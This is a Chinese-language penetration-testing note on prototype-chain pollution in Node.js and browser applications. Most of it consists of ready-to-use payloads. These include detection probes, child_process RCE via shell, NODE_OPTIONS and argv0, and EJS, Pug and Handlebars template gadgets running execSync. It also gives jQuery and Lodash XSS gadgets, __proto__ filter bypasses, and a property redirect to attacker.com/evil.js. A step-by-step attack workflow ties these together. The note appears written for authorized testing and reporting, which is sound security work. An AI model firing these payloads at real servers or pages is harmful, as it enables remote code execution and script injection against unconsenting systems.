# 原型链污染测试

污染之后的 Node 运行时逃逸（vm / happy-dom / flatnest）见 [[web/漏洞分类/Node.js 沙箱逃逸与原型链 RCE.md|Node.js 沙箱逃逸与原型链 RCE]]。

## 0. 判据速查

| 观察到的现象 | 说明 | 去哪节 |
|---|---|---|
| 后端 Node/Express，JSON 或 query 被深合并 | 写入点存在 | §1 |
| 前端 `$.extend(true,...)` / `_.merge` / qs | 客户端写入点 | §2 |
| 发了污染 payload，**干净请求**仍看到副作用 | 污染真的生效了（这一步才算确认） | §3 |
| 有 `res.render` / 模板引擎 | 模板 gadget → RCE | §4 |
| 有 `child_process.spawn/exec` | `shell` + `NODE_OPTIONS` 通用 RCE | §4.1 |
| 框架是 jQuery / Lodash / Angular / Vue | 客户端 gadget → XSS | §5 |
| `__proto__` 被过滤 | 换 `constructor.prototype` 等路径 | §6 |
| 只有 `Object.assign`（浅拷贝） | **安全**，不构成污染 | §6.4 |

**核心判据**：原型链污染的价值 = **被污染的那个属性恰好被某个下游组件当成配置读**。没有下游读取，污染再成功也只是脏数据。**先确认污染生效，再找 gadget，最后才发 RCE 串。**

---

## 1. 机制

访问 `obj.key` 时若 `obj` 没有自有 `key`，查找沿 `[[Prototype]]` 往上走到 `Object.prototype`。

**`__proto__`**：多数解析器把字面键 `__proto__` 当魔法路径，合并 `{"__proto__":{"x":1}}` 可能等价于 `Object.prototype.x = 1`（取决于实现和补丁级别）。

**`constructor.prototype`**：`constructor` 指向构造函数，`constructor.prototype` 是其原型对象。对普通对象通常就是 `Object.prototype`：

```json
{"constructor":{"prototype":{"polluted":1}}}
```

**这两条路不等价**（过滤、JSON 解析、Bun/Node 差异），**都要试**。

**关键**：不是「多一个参数」，而是非隔离的合并逻辑里攻击者可控的键指向了**原型对象** —— 后续所有代码正常读属性时都拿到了恶意值。

## 2. 写入点

### 2.1 服务端首轮探针

```json
{"__proto__":{"polluted":true}}
{"constructor":{"prototype":{"polluted":true}}}
```

发完再发一个**干净请求**，看是否有异常头/状态码/JSON 空格，或业务逻辑读到了 `Object.prototype.polluted`（见 §3 表）。

### 2.2 客户端首轮探针

```text
#__proto__[polluted]=1
#__proto__[polluted]=polluted
#constructor[prototype][polluted]=1
```

输入能反射进 DOM 或框架路由时，配合 `alert(1)` 观察全局属性是否被污染：

```text
#__proto__[xxx]=alert(1)
```

### 2.3 快速布尔：这些库直接提优先级

`lodash.merge`、`deep-extend`、`hoek.applyToDefaults`、部分 `qs` / `query-string` 配置。

## 3. 确认污染（服务端黑盒）

下面假定 body/query 被 `qs` 之类深解析成对象（可能经 `body-parser`）。**看全局副作用，不只看当前端点返回值。**

| Payload | 可观测信号 |
|---|---|
| `{"__proto__":{"parameterLimit":1}}` | 后续请求多参数解析被忽略或异常（`qs` 的 `parameterLimit`） |
| `{"__proto__":{"ignoreQueryPrefix":true}}` | `??foo=bar` 这类双问号前缀被接受，或行为突变 |
| `{"__proto__":{"allowDots":true}}` | `?foo.bar=baz` 这类嵌套键按点号展开 |
| `{"__proto__":{"json spaces":" "}}` | JSON 响应多出空格（`JSON.stringify` 的 spacing 被污染） |
| `{"__proto__":{"exposedHeaders":["foo"]}}` | CORS 响应出现 `foo` 相关头（框架从原型读配置时） |
| `{"__proto__":{"status":510}}` | 部分响应状态变成 510 等异常码（应用从对象读 `status`） |
| `{"__proto__":{"toString":1}}` | 服务端崩溃/500 —— `toString` 被覆盖 |
| `{"__proto__":{"valueOf":1}}` | 同上，崩溃式检测 |

**操作要点**：先发污染请求，再发**干净**请求看是否持续。连接池和 worker 生命周期决定影响是否全局可见 —— 多进程部署下可能只污染到一个 worker。

**客户端确认**：

```javascript
Object.prototype.testPollution        // 有值 → 有东西污染了原型

// 自动检测：劫持 __proto__ 的 setter
Object.defineProperty(Object.prototype, '__proto__', {
    set: function(v) { console.trace('PP detected!', v); }
});
```

**注意**：浏览器扩展和 DevTools 会干扰，用无痕窗口验证。

## 4. 服务端 gadget（Node）

### 4.1 `child_process` —— 通用 RCE

`spawn`/`fork` 没显式传 `env`/`shell` 时，从 `Object.prototype` 继承：

```javascript
const { execSync } = require('child_process');
execSync('ls');           // 从原型继承 shell、env
```

```json
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}
```

```javascript
Object.prototype.shell = '/proc/self/exe';
Object.prototype.argv0 = 'console.log(require("child_process").execSync("id").toString())//';
Object.prototype.NODE_OPTIONS = '--require /proc/self/cmdline';
```

**这是最通用的一条**：任何 Node 应用只要调用过 `child_process`，不用管用什么模板引擎。

### 4.2 模板引擎 gadget

| 引擎 | 污染属性 | Payload 核心 | 触发 |
|---|---|---|---|
| **EJS** | `outputFunctionName` | `"x;process.mainModule.require('child_process').execSync('CMD');s"` | 任意 `res.render()` |
| EJS | `destructuredLocals` | 数组注入控制变量声明 | `res.render()`（3.x） |
| EJS | `escapeFunction` | 替换转义函数为代码 | 带 HTML 转义的 `res.render()`（2.x–3.x） |
| **Pug** | `block` | `{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('CMD');//"}` | `pug.compile/render` |
| Pug | `self` + `line` | `true` + 注入 | 模板编译（2.x） |
| **Handlebars** | `allowProtoMethodsByDefault` + `allowProtoPropertiesByDefault` | 都设 `true`，再用 `{{obj.constructor.constructor "..."}}` | 任意渲染（4.6+） |
| Handlebars | `type` | `"Program"` + 恶意 `body` AST | `Handlebars.compile()` |
| **Nunjucks** | `type` | `{"type":"Code","value":"global.process..."}` | `nunjucks.render()` |
| Nunjucks | `autoesc` | `false` 关自动转义 | XSS 升级 |
| Twig.js | `allowInlineIncludes` | `true` | 文件包含（1.x） |
| Twig.js | `rethrow` | 自定义函数 | 代码执行（1.x） |
| Jade(旧) | `self` | `true` | 代码路径变化 → RCE 链 |

**EJS 展开**：

```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}
```

渲染任意模板后编译出的函数里多了一段：

```javascript
var x;process.mainModule.require('child_process').execSync('id');s = "";
```

**Pug 展开**：

```json
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('id');//"}}}
```

**Handlebars 展开**：

```json
{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","path":{"type":"PathExpression","original":"constructor.constructor('return process.mainModule.require(`child_process`).execSync(`id`)')()","parts":["constructor","constructor"]},"params":[],"hash":null}]}}
```

**Express `res.render` 通用路径**：`res.render` 会把 options 与 `app.locals`、`res.locals` 合并，被污染的原型属性直接成为模板变量：

```json
{"__proto__":{"view options":{"outputFunctionName":"x;process..."}}}
```

### 4.3 Fastify

| 属性 | 影响 |
|---|---|
| `reply.view` options | 同上模板 gadget → RCE（配合 point-of-view） |
| `rewriteUrl` | 路由重写 → 访问控制绕过（3.x） |
| `schema` | 校验 schema 被改 → 校验绕过（3.x–4.x） |

### 4.4 Node 核心属性全集

| 属性 | 值 | 触发 | 影响 |
|---|---|---|---|
| `shell` | `"node"` / `"/bin/sh"` | 未显式传 shell 的 `spawn()` | RCE |
| `NODE_OPTIONS` | `"--require /path/evil.js"` | `fork()` / `spawn()` | RCE（Node 8+） |
| `argv0` | 恶意参数 | `spawn()` | 代码注入 |
| `env` | 自定义环境变量 | 未显式传 env 的 `spawn()` | ENV 注入 |
| `input` | stdin 数据 | `execSync()` | 数据注入 |
| `stdio` | 改过的 stdio 配置 | `spawn()` | 文件描述符操纵 |

## 5. 客户端 gadget

### 5.1 jQuery

**写入点**：`$.extend(true, {}, userInput)`（第一个参数是 `true` 才是深合并）、`$.fn.extend()`。

| 污染属性 | 值 | 触发 | 影响 |
|---|---|---|---|
| `innerHTML` | `"<img src=x onerror=alert(1)>"` | DOM 操纵 | XSS（2.x–3.x） |
| `src` | `"javascript:alert(1)"` | 元素创建 | XSS |
| `href` | `"javascript:alert(1)"` | 链接创建 | XSS |
| `text` | 恶意串 | 空元素上的 `.text()` | 内容注入 |

```javascript
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
$('<div>').appendTo('body');    // 可能读到被污染的属性
```

### 5.2 Lodash

**写入点**（是 sink 不是 gadget）：`_.merge`、`_.defaultsDeep`、`_.set`、`_.setWith`。

| 污染属性 | 值 | 触发 | 影响 |
|---|---|---|---|
| `sourceURL` | `"\u000ajavascript:alert(1)//"` | `_.template()` 执行 | XSS（< 4.17.21） |
| `template` | 模板串 | `_.template()` | 代码注入 |
| `imports._.templateSettings.interpolate` | 自定义正则 | `_.template()` | 代码注入 |

```javascript
_.merge({}, JSON.parse('{"__proto__":{"sourceURL":"\\u000ajavascript:alert(1)//"}}'));
_.template('hello')();     // sourceURL 被塞进 Function 构造器
```

### 5.3 各框架 gadget 表

| 框架 | gadget | 污染属性 | 影响 |
|---|---|---|---|
| Angular 1.x | `$interpolate` / `$compile` | `__defineGetter__` | XSS |
| Angular 1.x | 作用域链操纵 | `$parent` | 沙箱绕过（< 1.6） |
| Angular 1.x | HTTP 拦截器 | `charset` | 响应篡改 |
| Vue 2.x | 未显式传 template 的组件 | `template` | XSS |
| Vue 2.x | 组件挂载 | `render` / `staticRenderFns` | 代码执行 |
| Vue 3.x | 模板编译 | `compilerOptions` | 多种 |
| Ember | 组件渲染 | 各种 view 属性 | XSS |
| Backbone | `_.template` | `sourceURL` | XSS |
| Webpack 4–5 | **构建期** | `output.library` / `output.auxiliaryComment` / `devtool` | 产物代码注入 |
| minimist < 1.2.6 | CLI 参数 | `--__proto__.polluted yes` | 原型污染 |
| qs < 6.0.4 | 查询串 | `?__proto__[polluted]=yes` | 原型污染 |
| destr / json5（旧版） | JSON 解析 | `{"__proto__":{...}}` | 原型污染 |

**Webpack 的污染是构建期的**，不在运行时 —— 在 CI/CD 攻击链里才有意义。

### 5.4 DOM 属性污染

```javascript
Object.prototype.src = 'https://attacker.com/evil.js';
Object.prototype.href = 'javascript:alert(1)';
Object.prototype.action = 'https://attacker.com/phish';
// 任何动态创建的元素都可能继承这些
```

## 6. 绕过 `__proto__` 过滤

### 6.1 `constructor.prototype` 路径

```json
{"constructor":{"prototype":{"polluted":"yes"}}}
```

### 6.2 方括号变体

```
?constructor[prototype][polluted]=yes
?__proto__[polluted]=yes
?__pro__proto__to__[polluted]=yes      # 过滤只剥一次 __proto__ 时
```

### 6.3 JSON 键变体

```json
{"__proto__": {"a": 1}}
{"constructor": {"prototype": {"a": 1}}}
{"__proto__\u0000": {"a": 1}}
```

### 6.4 浅拷贝是安全的

**`Object.assign` 不污染原型**（浅拷贝）。只有递归/深合并才脆弱。**先确认合并深度** —— 把浅拷贝误判成写入点是最常见的假阳性。

## 7. 完整打法

```
1. 找合并 sink
   └── JSON body 被解析并深合并进服务端对象

2. 确认污染
   └── {"__proto__":{"testxyz":"1"}} → 干净请求里看到 testxyz 全局可见

3. 认技术栈
   ├── Express + EJS        → outputFunctionName
   ├── Express + Pug        → block
   ├── Express + Handlebars → type/program 或 allowProto*
   ├── 任意 Node + child_process → shell / NODE_OPTIONS
   ├── 客户端 jQuery        → innerHTML / src
   ├── 客户端 Lodash        → sourceURL
   └── 认不出               → 按 §4.2 / §5.3 逐条试

4. 按 gadget 造 RCE/XSS payload

5. 先用安全 payload 验证（sleep / DNS 回调）

6. 再升级到完整 RCE
```

**命令用 `echo 标记 && id`，不要直接反弹** —— 反弹容易被网络策略挡，`echo` 标记能确认执行，`id` 能确认身份。

## 10. 纪律

- **污染成功 ≠ 漏洞成立**。必须演示「改了原型 → 某行为变了」。只证明「我改了 `Object.prototype`」在报告里没有说服力。
- **先探针，后 gadget，最后 RCE 串**。一上来喷 `outputFunctionName` 会被过滤拦，而且你无法判断是「没污染」还是「gadget 不对」。
- **干净请求验证**。发完污染立刻发一个不带 payload 的请求 —— 只看当前端点返回值会把「本次请求内的正常回显」误判成污染。
- **`Object.assign` 不是写入点**。浅拷贝安全，别把它算进来。
- **`__proto__` 被拦不代表没戏**。`constructor.prototype`、方括号、`\u0000` 变体都值得试。
- **优先 `child_process` 那条**。它不依赖模板引擎，任何 Node 应用都可能有。
- **报的是 RCE / 数据泄露不是「原型链污染」**。污染只是路径，成果落到命令执行或跨权限数据。
